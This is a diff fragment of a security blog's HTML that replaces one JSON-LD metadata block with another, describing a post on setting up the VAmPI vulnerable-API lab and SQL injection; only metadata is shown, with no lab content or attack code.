-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yuuki's blog","url":"https://blog.uuki.moe/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/","sameAs":["https://github.com/volantis-x"],"description":"CyberSec | WebSec | Blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://blog.uuki.moe/","name":"Yuuki's blog"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yuuki's blog","url":"https://blog.uuki.moe/","keywords":"Security blog","description":"CyberSec | WebSec | Blog","author":{"@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/","description":"CyberSec | WebSec | Blog"},"publisher":{"@type":"Organization","name":"Yuuki's blog","url":"https://blog.uuki.moe/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://blog.uuki.moe?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Links","description":"CyberSec | WebSec | Blog","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.uuki.moe/friends/index.html"},"author":{"@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/"},"publisher":{"@type":"Organization","name":"Yuuki's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://blog.uuki.moe/friends/index.html","wordCount":0,"datePublished":"2023-05-28T11:50:14.126Z","dateModified":"2023-05-28T11:50:14.125Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Yuuki's blog","url":"https://blog.uuki.moe/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/","sameAs":["https://github.com/volantis-x"],"description":"CyberSec | WebSec | Blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://blog.uuki.moe/","name":"Yuuki's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://blog.uuki.moe/categories/sec/","name":"sec"}},{"@type":"ListItem","position":3,"item":{"@id":"https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/","name":"Lab - VAmPI - 环境搭建 & SQL Injection"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Yuuki's blog","url":"https://blog.uuki.moe/","keywords":"Security blog","description":"CyberSec | WebSec | Blog","author":{"@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/","description":"CyberSec | WebSec | Blog"},"publisher":{"@type":"Organization","name":"Yuuki's blog","url":"https://blog.uuki.moe/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://blog.uuki.moe?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Lab - VAmPI - 环境搭建 & SQL Injection","description":"VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/"},"author":{"@type":"Person","name":"yuuki","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://blog.uuki.moe/"},"publisher":{"@type":"Organization","name":"Yuuki's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/","wordCount":160,"datePublished":"2023-05-30T19:50:16.000Z","dateModified":"2023-06-01T23:47:46.572Z","articleSection":"sec","keywords":"Pentesting API","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
